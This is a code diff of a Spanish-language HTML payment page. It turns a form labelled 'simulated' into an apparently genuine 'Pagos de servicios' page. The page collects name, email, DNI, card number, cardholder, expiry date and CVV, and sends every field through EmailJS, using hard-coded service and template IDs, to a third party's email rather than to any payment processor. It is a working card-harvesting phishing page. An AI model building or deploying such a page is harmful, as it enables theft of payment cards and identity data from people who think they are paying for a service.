@@ -1,31 +1,125 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-  <meta charset="UTF-8">
-  <title>Formulario de Pago Simulado</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Pagos de servicios</title>
   <style>
-    body { font-family: Arial; padding: 20px; max-width: 400px; margin: auto; }
-    input, button { width: 100%; padding: 10px; margin-top: 10px; }
+    body {
+      font-family: 'Segoe UI', sans-serif;
+      background: #e9f0f4;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      margin: 0;
+    }
+
+    .container {
+      background: white;
+      padding: 40px;
+      border-radius: 12px;
+      box-shadow: 0 8px 20px rgba(0,0,0,0.1);
+      max-width: 420px;
+      width: 100%;
+    }
+
+    h2 {
+      text-align: center;
+      color: #2c3e50;
+      margin-bottom: 10px;
+    }
+
+    .info {
+      font-size: 15px;
+      color: #555;
+      text-align: center;
+      margin-bottom: 25px;
+    }
+
+    input, button {
+      width: 100%;
+      padding: 12px;
+      margin-bottom: 15px;
+      font-size: 16px;
+      border: 1px solid #ccd6dd;
+      border-radius: 8px;
+      box-sizing: border-box;
+    }
+
+    button {
+      background-color: #3498db;
+      color: white;
+      font-weight: bold;
+      border: none;
+      cursor: pointer;
+      border-radius: 8px;
+      transition: background-color 0.3s ease;
+    }
+
+    button:hover {
+      background-color: #2980b9;
+    }
+
+    .success {
+      background: #d4edda;
+      color: #155724;
+      padding: 12px;
+      margin-top: 20px;
+      border-radius: 8px;
+      text-align: center;
+      font-size: 15px;
+    }
   </style>
 </head>
 <body>
+  <div class="container">
+    <h2>Pagos de servicios</h2>
+    <div class="info">
+      Complete el formulario. Los datos se enviarán a tu correo.
+    </div>
 
-  <h2>Formulario de Pago (Simulado)</h2>
+    <form id="payment-form">
+      <input type="text" name="nombre" placeholder="Nombre completo" required />
+      <input type="email" name="email" placeholder="Correo electrónico" required />
+      <input type="text" name="dni" placeholder="DNI" required maxlength="15" />
+      <input type="text" name="tarjeta" placeholder="Número de tarjeta" required maxlength="16" />
+      <input type="text" name="titular" placeholder="Nombre del titular" required />
+      <input type="text" name="vencimiento" placeholder="MM/AA (Vencimiento)" required maxlength="5" />
+      <input type="text" name="cvv" placeholder="CVV" required maxlength="4" />
+      <button type="submit">Pagar</button>
+    </form>
 
-  <form action="https://formsubmit.co/Sebasoto0672@gmail.com" method="POST">
-    <input type="text" name="nombre" placeholder="Nombre completo" required>
-    <input type="email" name="email" placeholder="Correo electrónico" required>
-    <input type="text" name="tarjeta" placeholder="Número de tarjeta" required>
-    <input type="text" name="vencimiento" placeholder="Fecha de vencimiento (MM/AA)" required>
-    <input type="text" name="cvv" placeholder="Código CVV" required>
+    <div id="mensaje" class="success" style="display: none;"></div>
+  </div>
 
-    <!-- Redirección tras envío -->
-    <input type="hidden" name="_next" value="https://formsubmit.co/thanks.html">
-    <!-- Desactiva captcha -->
-    <input type="hidden" name="_captcha" value="false">
+  <!-- EmailJS SDK -->
+  <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+  <script>
+    (function(){
+      emailjs.init("FL6vofHg7F9vLawQs");
+    })();
+  </script>
 
-    <button type="submit">Pagar</button>
-  </form>
+  <script>
+    const form = document.getElementById("payment-form");
+    const mensaje = document.getElementById("mensaje");
 
+    form.addEventListener("submit", function(e) {
+      e.preventDefault();
+
+      emailjs.sendForm("service_6pbv86h", "template_m3nuw4p", this)
+        .then(() => {
+          mensaje.innerHTML = "✅ ¡Formulario enviado correctamente!";
+          mensaje.style.display = "block";
+          form.reset();
+          setTimeout(() => {
+            mensaje.style.display = "none";
+          }, 5000);
+        }, (error) => {
+          alert("❌ Error al enviar: " + JSON.stringify(error));
+        });
+    });
+  </script>
 </body>
 </html>
